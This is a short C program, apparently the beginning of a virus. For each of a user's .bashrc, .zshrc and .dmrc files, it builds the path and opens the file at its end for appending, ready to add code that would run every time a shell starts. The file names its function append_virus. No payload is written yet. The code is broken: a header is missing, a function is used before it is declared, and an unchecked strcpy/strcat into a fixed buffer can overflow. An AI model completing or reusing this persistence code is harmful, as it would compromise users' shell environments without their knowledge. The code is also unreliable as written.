#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>

static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};

int main(){

  char * home_dir_path= getenv("HOME");

  for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
    append_virus(home_dir_path, CONFIGS[i]);
  }

}

int append_virus(char * home_dir, char * config_file){
  char buffer[1024] = "";

  strcpy(buffer, home_dir);
  strcat(buffer, config_file);

  printf("%s\n", buffer);

  int fd = open(buffer, O_WRONLY|O_CREAT, 0644);
  if(fd < 0){
    perror("no file exists");
    return -1;
  }


  lseek(fd, 0, SEEK_END);

}
